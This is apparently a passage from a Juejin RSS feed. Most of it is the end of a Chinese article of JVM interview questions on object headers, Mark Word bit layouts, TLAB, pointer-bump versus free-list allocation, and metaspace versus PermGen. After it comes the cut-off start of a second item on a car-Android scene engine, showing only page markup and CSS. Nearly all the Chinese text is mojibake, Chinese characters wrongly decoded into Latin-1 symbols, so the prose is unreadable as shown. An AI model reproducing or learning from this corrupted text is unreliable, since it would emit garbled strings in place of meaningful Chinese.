<p><strong>å­˜å‚¨è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡å¤´</strong>ï¼šåŒ…å«Mark Wordå’Œç±»å‹æŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†å¯¹è±¡å’ŒæŒ‡å‘ç±»ä¿¡æ¯</li>
<li><strong>å®ä¾‹æ•°æ®</strong>ï¼šå­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼ï¼ŒæŒ‰ç…§æŸç§ç­–ç•¥æ’åº</li>
<li><strong>å¯¹é½å¡«å……</strong>ï¼šä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°ï¼Œæé«˜è®¿é—®æ•ˆç‡</li>
</ol>
<p><strong>å†…å­˜åˆ†é…ä½ç½®ï¼š</strong></p>
<ul>
<li>æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡ä¼šè¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>4. å¤šçº¿ç¨‹å¦‚ä½•è®¿é—®å †ä¸­çš„å…±äº«å¯¹è±¡ï¼Ÿ</strong></p>
<ol>
<li>çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«åŒä¸€ä¸ªå¯¹è±¡</li>
<li>è®¿é—®å…±äº«å¯¹è±¡éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ol>
<p><strong>5. ä¸ºä»€ä¹ˆéœ€è¦JMMï¼ŸJVMå†…å­˜åŒºåŸŸä¸å¤Ÿå—ï¼Ÿ</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåªå®šä¹‰äº†æ•°æ®å­˜å‚¨åœ¨å“ªé‡Œï¼Œä½†æ²¡æœ‰å®šä¹‰å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¦‚ä½•ä¿è¯å†…å­˜çš„å¯è§æ€§å’Œæœ‰åºæ€§ã€‚JMMæä¾›äº†å†…å­˜è®¿é—®è§„èŒƒï¼Œè§£å†³å¤šçº¿ç¨‹å¹¶å‘è®¿é—®çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-91">16. é«˜çº§é¢è¯•é¢˜</h3>
<h4 data-id="heading-92">16.1 æ·±å…¥åŸç†é¢˜</h4>
<p><strong>1. å¯¹è±¡åœ¨å †ä¸­çš„åˆ†é…è¿‡ç¨‹ï¼Ÿè¯·ç”»å‡ºè¯¦ç»†æµç¨‹å›¾</strong></p>
<p>å¯¹è±¡åœ¨å †ä¸­çš„åˆ†é…è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">åˆ†é…è¿‡ç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
   â†“
<span class="hljs-bullet">2.</span> é€‰æ‹©åˆ†é…æ–¹å¼
   â”œâ”€ æŒ‡é’ˆç¢°æ’ï¼ˆå †è§„æ•´ï¼‰
   â”œâ”€ ç©ºé—²åˆ—è¡¨ï¼ˆå †ä¸è§„æ•´ï¼‰
   â””â”€ TLABï¼ˆçº¿ç¨‹æœ¬åœ°åˆ†é…ç¼“å†²ï¼‰
   â†“
<span class="hljs-bullet">3.</span> åœ¨EdenåŒºåˆ†é…
   â””â”€ ä¼˜å…ˆåœ¨TLABä¸­åˆ†é…
   â””â”€ TLABç”¨å®Œååœ¨EdenåŒºå…±äº«åŒºåˆ†é…
   â†“
<span class="hljs-bullet">4.</span> å¦‚æœEdenåŒºæ»¡ â†’ Minor GC
   â†“
<span class="hljs-bullet">5.</span> å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°SurvivoråŒº
   â†“
<span class="hljs-bullet">6.</span> å¤šæ¬¡GCåæ™‹å‡åˆ°è€å¹´ä»£
</code></pre>
<p><strong>åˆ†é…æ–¹å¼è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>æŒ‡é’ˆç¢°æ’</strong>ï¼šé€‚ç”¨äºå †å†…å­˜è§„æ•´ï¼Œç§»åŠ¨æŒ‡é’ˆåˆ†é…è¿ç»­å†…å­˜</li>
<li><strong>ç©ºé—²åˆ—è¡¨</strong>ï¼šé€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´ï¼Œä»ç©ºé—²åˆ—è¡¨åˆ†é…</li>
<li><strong>TLAB</strong>ï¼šæ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼Œå‡å°‘ç«äº‰</li>
</ul>
<p><strong>2. Mark Wordçš„è¯¦ç»†ç»“æ„ï¼Ÿ</strong></p>
<p><strong>Mark Wordç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>
<p>Mark Wordåœ¨64ä½JVMä¸­å 8å­—èŠ‚ï¼ˆ64ä½ï¼‰ï¼Œåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯ï¼š</p>



































<table><thead><tr><th>é”çŠ¶æ€</th><th>Mark Wordï¼ˆ64ä½ï¼‰</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>25ä½æœªä½¿ç”¨ + 31ä½hashCode + 1ä½æœªä½¿ç”¨ + 4ä½GCå¹´é¾„ + 1ä½åå‘é”æ ‡å¿—(0) + 2ä½é”æ ‡å¿—(01)</td><td>æ­£å¸¸çŠ¶æ€</td></tr><tr><td><strong>åå‘é”</strong></td><td>54ä½çº¿ç¨‹ID + 2ä½Epoch + 1ä½æœªä½¿ç”¨ + 4ä½GCå¹´é¾„ + 1ä½åå‘é”æ ‡å¿—(1) + 2ä½é”æ ‡å¿—(01)</td><td>åå‘é”çŠ¶æ€</td></tr><tr><td><strong>è½»é‡çº§é”</strong></td><td>62ä½æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ + 2ä½é”æ ‡å¿—(00)</td><td>è½»é‡çº§é”çŠ¶æ€</td></tr><tr><td><strong>é‡é‡çº§é”</strong></td><td>62ä½æŒ‡å‘monitorçš„æŒ‡é’ˆ + 2ä½é”æ ‡å¿—(10)</td><td>é‡é‡çº§é”çŠ¶æ€</td></tr><tr><td><strong>GCæ ‡è®°</strong></td><td>ç©ºï¼ˆä¸éœ€è¦è®°å½•ä¿¡æ¯ï¼‰ + 2ä½é”æ ‡å¿—(11)</td><td>GCæ ‡è®°çŠ¶æ€</td></tr></tbody></table>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å¤ç”¨ï¼Œå­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
<li>é”æ ‡å¿—ä½ï¼ˆæœ€å2ä½ï¼‰ç”¨äºæ ‡è¯†é”çŠ¶æ€</li>
<li>è¿™æ˜¯synchronizedé”å‡çº§æœºåˆ¶çš„åŸºç¡€</li>
</ul>
<p><strong>3. å¯¹è±¡å¤´çš„å®Œæ•´ç»“æ„ï¼Ÿ</strong></p>
<p>å¯¹è±¡å¤´çš„å®Œæ•´ç»“æ„ï¼š</p>
<p><strong>å¯¹è±¡å¤´ï¼ˆObject Headerï¼‰ï¼š</strong></p>
<ol>
<li>
<p><strong>Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½JVMå 32ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ64ä½JVMå 64ä½ï¼ˆ8å­—èŠ‚ï¼‰</li>
<li><strong>å†…å®¹</strong>ï¼šhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ã€åå‘çº¿ç¨‹IDç­‰</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½JVMå 32ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ64ä½JVMå 64ä½ï¼ˆ8å­—èŠ‚ï¼Œå¯èƒ½å‹ç¼©ä¸º32ä½ï¼‰</li>
<li><strong>å†…å®¹</strong>ï¼šæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰</li>
<li><strong>ä½œç”¨</strong>ï¼šJVMé€šè¿‡è¿™ä¸ªæŒ‡é’ˆç¡®å®šå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹</li>
</ul>
</li>
<li>
<p><strong>æ•°ç»„é•¿åº¦ï¼ˆArray Lengthï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½æ•´æ•°ï¼ˆ4å­—èŠ‚ï¼‰</li>
<li><strong>å­˜åœ¨æ¡ä»¶</strong>ï¼šä»…å½“å¯¹è±¡æ˜¯æ•°ç»„æ—¶æ‰æœ‰</li>
<li><strong>å†…å®¹</strong>ï¼šæ•°ç»„çš„é•¿åº¦</li>
</ul>
</li>
</ol>
<p><strong>å®Œæ•´ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å¤´ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  <span class="hljs-selector-tag">Mark</span> Word      â”‚ <span class="hljs-number">8</span>å­—èŠ‚ï¼ˆ<span class="hljs-number">64</span>ä½ï¼‰æˆ–<span class="hljs-number">4</span>å­—èŠ‚ï¼ˆ<span class="hljs-number">32</span>ä½ï¼‰
â”‚  (é”çŠ¶æ€ä¿¡æ¯)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç±»å‹æŒ‡é’ˆ        â”‚ <span class="hljs-number">8</span>å­—èŠ‚æˆ–<span class="hljs-number">4</span>å­—èŠ‚ï¼ˆå¯èƒ½å‹ç¼©ï¼‰
â”‚  (æŒ‡å‘ç±»ä¿¡æ¯)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ•°ç»„é•¿åº¦        â”‚ <span class="hljs-number">4</span>å­—èŠ‚ï¼ˆä»…æ•°ç»„å¯¹è±¡ï¼‰
â”‚  (æ•°ç»„é•¿åº¦)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>4. TLABçš„å·¥ä½œåŸç†ï¼Ÿ</strong></p>
<p>æ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„TLABï¼Œå¯¹è±¡ä¼˜å…ˆåœ¨TLABä¸­åˆ†é…ï¼ŒTLABç”¨å®Œååœ¨å…±äº«åŒºåˆ†é…ï¼ˆéœ€è¦åŒæ­¥ï¼‰ã€‚</p>
<p><strong>5. æŒ‡é’ˆç¢°æ’å’Œç©ºé—²åˆ—è¡¨çš„å®ç°ï¼Ÿ</strong></p>
<p><strong>1. æŒ‡é’ˆç¢°æ’ï¼ˆBump the Pointerï¼‰å®ç°ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æŒ‡é’ˆç¢°æ’ï¼š

<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                 â†‘æŒ‡é’ˆ â†’ åç§» â†’ <span class="hljs-selector-attr">[æ–°å¯¹è±¡]</span>
</code></pre>
<p><strong>2. ç©ºé—²åˆ—è¡¨ï¼ˆFree Listï¼‰å®ç°ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">ç©ºé—²åˆ—è¡¨ï¼š

<span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡3]</span>
ç©ºé—²åˆ—è¡¨: <span class="hljs-section">[ä½ç½®1, ä½ç½®3]</span> â†’ é€‰æ‹©ä½ç½®åˆ†é…æ–°å¯¹è±¡
</code></pre>
<p><strong>å¯¹æ¯”ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>æŒ‡é’ˆç¢°æ’</th><th>ç©ºé—²åˆ—è¡¨</th></tr></thead><tbody><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>å †å†…å­˜è§„æ•´</td><td>å †å†…å­˜ä¸è§„æ•´</td></tr><tr><td><strong>åˆ†é…é€Ÿåº¦</strong></td><td>å¿«ï¼ˆåªéœ€ç§»åŠ¨æŒ‡é’ˆï¼‰</td><td>è¾ƒæ…¢ï¼ˆéœ€è¦æŸ¥æ‰¾ç©ºé—²åˆ—è¡¨ï¼‰</td></tr><tr><td><strong>å†…å­˜ç¢ç‰‡</strong></td><td>æ— ç¢ç‰‡</td><td>å¯èƒ½æœ‰ç¢ç‰‡</td></tr><tr><td><strong>å®ç°å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚</td></tr></tbody></table>
<p><strong>6. å¯¹è±¡è®¿é—®å®šä½çš„åº•å±‚å®ç°ï¼Ÿ</strong></p>
<p><strong>HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®çš„åº•å±‚å®ç°ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">ç›´æ¥æŒ‡é’ˆè®¿é—®å®ç°ï¼š

æ ˆå¼•ç”¨(åœ°å€) â†’ å †ä¸­çš„å¯¹è±¡ â†’ å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆ â†’ æ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯

åªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®ï¼Œç›´æ¥è®¿é—®å¯¹è±¡
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼šåªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®</li>
<li>å®ç°ç®€å•ï¼šå¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</li>
<li>å†…å­˜å ç”¨å°ï¼šä¸éœ€è¦é¢å¤–çš„å¥æŸ„æ± </li>
</ul>
<p><strong>ä»£ä»·ï¼š</strong></p>
<ul>
<li>GCæ—¶éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼šå¯¹è±¡ç§»åŠ¨æ—¶éœ€è¦æ›´æ–°æ‰€æœ‰æŒ‡å‘è¯¥å¯¹è±¡çš„å¼•ç”¨</li>
<li>HotSpoté€šè¿‡ä¼˜åŒ–GCç®—æ³•æ¥å‡å°‘å¯¹è±¡ç§»åŠ¨ï¼Œé™ä½è¿™ä¸ªå¼€é”€</li>
</ul>
<h4 data-id="heading-93">16.2 æ–°æŠ€æœ¯é¢˜</h4>
<p><strong>1. å…ƒç©ºé—´ç›¸æ¯”æ°¸ä¹…ä»£çš„ä¼˜åŠ¿ï¼Ÿ</strong></p>
<p>å…ƒç©ºé—´ç›¸æ¯”æ°¸ä¹…ä»£çš„ä¸»è¦ä¼˜åŠ¿ï¼š</p>
<ol>
<li>
<p><strong>æé«˜GCæ•ˆç‡</strong></p>
<ul>
<li>æ°¸ä¹…ä»£GCæ•ˆç‡è¾ƒä½ï¼Œå®¹æ˜“å¯¼è‡´Full GC</li>
<li>å…ƒç©ºé—´GCæ•ˆç‡æ›´é«˜ï¼Œå¯ä»¥æ›´åŠæ—¶åœ°å›æ”¶ç±»å…ƒæ•°æ®</li>
</ul>
</li>
<li>
<p><strong>é¿å…å†…å­˜æº¢å‡º</strong></p>
<ul>
<li>æ°¸ä¹…ä»£å¤§å°å›ºå®šï¼Œå®¹æ˜“å‘ç”ŸOutOfMemoryError: PermGen space</li>
<li>å…ƒç©ºé—´å¤§å°åŠ¨æ€è°ƒæ•´ï¼Œä¸å®¹æ˜“æº¢å‡ºï¼ˆé™¤éè¾¾åˆ°MaxMetaspaceSizeï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ›´å¥½çš„å†…å­˜ç®¡ç†</strong></p>
<ul>
<li>æ°¸ä¹…ä»£åœ¨å †ä¸­ï¼Œå—å †å†…å­˜é™åˆ¶</li>
<li>å…ƒç©ºé—´åœ¨æœ¬åœ°å†…å­˜ï¼Œä¸å—å †å†…å­˜é™åˆ¶ï¼Œç®¡ç†æ›´çµæ´»</li>
</ul>
</li>
<li>
<p><strong>ä¸HotSpotåˆ†ç¦»</strong></p>
<ul>
<li>æ°¸ä¹…ä»£çš„å®ç°ä¸HotSpotè€¦åˆ</li>
<li>å…ƒç©ºé—´çš„å®ç°ä¸HotSpotåˆ†ç¦»ï¼Œæ›´å®¹æ˜“ä¼˜åŒ–</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ°¸ä¹…ä»£ï¼šå›ºå®šå¤§å°ï¼Œå®¹æ˜“æº¢å‡º</span>
-XX:PermSize=64m
-XX:MaxPermSize=256m
<span class="hljs-comment">// å¦‚æœç±»åŠ è½½è¿‡å¤šï¼Œå¯èƒ½æº¢å‡º</span>

<span class="hljs-comment">// å…ƒç©ºé—´ï¼šåŠ¨æ€è°ƒæ•´ï¼Œä¸å®¹æ˜“æº¢å‡º</span>
-XX:MetaspaceSize=64m
-XX:MaxMetaspaceSize=256m
<span class="hljs-comment">// ä¼šæ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µåŠ¨æ€è°ƒæ•´</span>
</code></pre>
<p><strong>2. ç°ä»£JVMçš„å†…å­˜ç®¡ç†ä¼˜åŒ–ï¼Ÿ</strong></p>
<ul>
<li>æŒ‡é’ˆå‹ç¼©</li>
<li>å¯¹è±¡å¯¹é½ä¼˜åŒ–</li>
<li>TLABä¼˜åŒ–</li>
<li>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>3. å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£çš„æœºåˆ¶ï¼Ÿ</strong></p>
<p>è¶…è¿‡-XX:PretenureSizeThresholdè®¾ç½®çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œé¿å…åœ¨EdenåŒºå’ŒSurvivoråŒºä¹‹é—´å¤åˆ¶ã€‚</p>
<p><strong>4. åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®šçš„åŸç†ï¼Ÿ</strong></p>
<p>SurvivoråŒºä¸­ç›¸åŒå¹´é¾„çš„å¯¹è±¡å¤§å°è¶…è¿‡SurvivoråŒºçš„ä¸€åŠæ—¶ï¼Œå¤§äºç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«]]></title>    <link>https://juejin.cn/post/7592593491860946944</link>    <guid>https://juejin.cn/post/7592593491860946944</guid>    <pubDate>2026-01-08T07:21:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592593491860946944" data-draft-id="7592119218029969442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T07:21:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—æ ©link"/> <meta itemprop="url" content="https://juejin.cn/user/870468939434039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/870468939434039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—æ ©link
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:21:15.000Z" title="Thu Jan 08 2026 07:21:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and 